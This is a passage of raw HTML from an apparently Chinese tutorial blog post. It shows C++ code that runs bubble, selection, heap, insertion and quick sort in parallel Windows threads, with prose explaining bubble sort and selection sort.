class=\"crayon-v\">StructData1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">TID1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-37\">　<span class=\"crayon-e\">CreateThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">SelectSort</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">StructData2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">TID2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-38\">　<span class=\"crayon-e\">CreateThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">HeapSort</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">StructData3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">TID3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-39\">　<span class=\"crayon-e\">CreateThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">InsertSort</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">StructData4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">TID4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-40\">　<span class=\"crayon-c\">//在主线程中执行行快速排序，其他排序在子线程中执行 </span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-41\">　<span class=\"crayon-e\">QuickSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-42\">　<span class=\"crayon-e\">PrintResult</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iDataLen</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Quick Sort\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-43\">　<span class=\"crayon-e\">WaitForSingleObject</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">evtTerminate</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INFINITE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//等待所有的子线程结束</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-44\">　<span class=\"crayon-c\">//所有的子线程结束后，主线程才可以结束</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-45\">　<span class=\"crayon-v\">delete</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-46\">　<span class=\"crayon-v\">delete</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-47\">　<span class=\"crayon-v\">delete</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-48\">　<span class=\"crayon-v\">delete</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data4</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-49\">　<span class=\"crayon-e\">CloseHandle</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">evtPrint</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b77569797578-50\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b77569797578-51\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0105 seconds] -->\r\n<p>冒泡排序思想(升序，降序同理，后面的算法一样都是升序):从头到尾对数据进行两两比较进行交换,小的放前大的放后。这样一次下来，最大的元素就会被交换的最后，然后下一次<br>\n循环就不用对最后一个元素进行比较交换了，所以呢每一次比较交换的次数都比上一次循环的次数少一，这样N次之后数据就变得升序排列了</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b7d749275020\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nunsigned long __stdcall BubbleSort(void* theArray)\r\n{\r\n　long* Array = ((MySafeArray*)theArray)-&gt;data;\r\n　int iLength = ((MySafeArray*)theArray)-&gt;iLength;\r\n　int i, j=0;\r\n　long swap;\r\n　for (i = iLength-1; i &gt;0; i--)\r\n　{\r\n　　for(j = 0; j &lt; i; j++)\r\n　　{\r\n　　　if(Array[j] &gt;Array[j+1]) //前比后大，交换\r\n　　　{\r\n　　　　swap = Array[j];\r\n　　　　Array[j] = Array[j+1];\r\n　　　　Array[j+1] = swap;\r\n　　　}\r\n　　}\r\n　}\r\n　PrintResult(Array, iLength, \"Bubble Sort\"); //向控制台打印排序结果\r\n　InterlockedIncrement(&amp;ThreadCompleted); //返回前使线程完成数标记加1\r\n　if(ThreadCompleted == 4) SetEvent(evtTerminate); //检查是否其他线程都已执行完\r\n　//若都执行完则设置程序结束信号量\r\n　return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b7d749275020-24\">24</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-1\"><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__stdcall </span><span class=\"crayon-e\">BubbleSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-3\">　<span class=\"crayon-t\">long</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">MySafeArray*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-4\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">MySafeArray*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">iLength</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-5\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-6\">　<span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">swap</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-7\">　<span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-8\">　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-9\">　　<span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-10\">　　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-11\">　　　<span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//前比后大，交换</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-12\">　　　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-13\">　　　　<span class=\"crayon-v\">swap</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-14\">　　　　<span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-15\">　　　　<span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">swap</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-16\">　　　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-17\">　　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-18\">　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-19\">　<span class=\"crayon-e\">PrintResult</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Bubble Sort\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//向控制台打印排序结果</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-20\">　<span class=\"crayon-e\">InterlockedIncrement</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">ThreadCompleted</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//返回前使线程完成数标记加1</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-21\">　<span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ThreadCompleted</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SetEvent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">evtTerminate</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//检查是否其他线程都已执行完</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-22\">　<span class=\"crayon-c\">//若都执行完则设置程序结束信号量</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b7d749275020-23\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b7d749275020-24\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0043 seconds] -->\r\n<p>选择排序思想:每一次都从无序的数据中找出最小的元素，然后和前面已经有序的元素序列的后一个元素进行交换，这样整个源序列就会分成两部分，前面一部分是已经排好序的有序序列，后面一部分是无序的，用于选出最小的元素。循环N次之后，前面的有序序列加长到跟源序列一样长，后面的无序部分长度变为0，排序就完成了。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b81274073408\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nunsigned long __stdcall SelectSort(void* theArray)\r\n{\r\n　long* Array = ((MySafeArray*)theArray)-&gt;data;\r\n　int iLength = ((MySafeArray*)theArray)-&gt;iLength;\r\n　long lMin, lSwap;\r\n　int i, j, iMinPos;\r\n　for(i=0; i &lt; iLength-1; i++)\r\n　{\r\n　　lMin = Array[i];\r\n　　iMinPos = i;\r\n　　for(j=i + 1; j &lt;= iLength-1; j++) //从无序的元素中找出最小的元素\r\n　　{\r\n　　　if(Array[j] &lt; lMin)\r\n　　　{\r\n　　　　iMinPos = j;\r\n　　　　lMin = Array[j];\r\n　　　}\r\n　　}\r\n　　//把选出的元素交换拼接到有序序列的最后\r\n　　lSwap = Array[i];\r\n　　Array[i] = Array[iMinPos];\r\n　　Array[iMinPos] = lSwap;\r\n　}\r\n　PrintResult(Array, iLength, \"Select Sort\"); //向控制台打印排序结果\r\n　InterlockedIncrement(&amp;ThreadCompleted); //返回前使线程完成数标记加1\r\n　if(ThreadCompleted == 4) SetEvent(evtTerminate);//检查是否其他线程都已执行完\r\n　//若都执行完则设置程序结束信号量\r\n　return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b81274073408-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b81274073408-29\">29</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-1\"><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__stdcall </span><span class=\"crayon-e\">SelectSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b81274073408-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b81274073408-3\">　<span class=\"crayon-t\">long</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">MySafeArray*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" 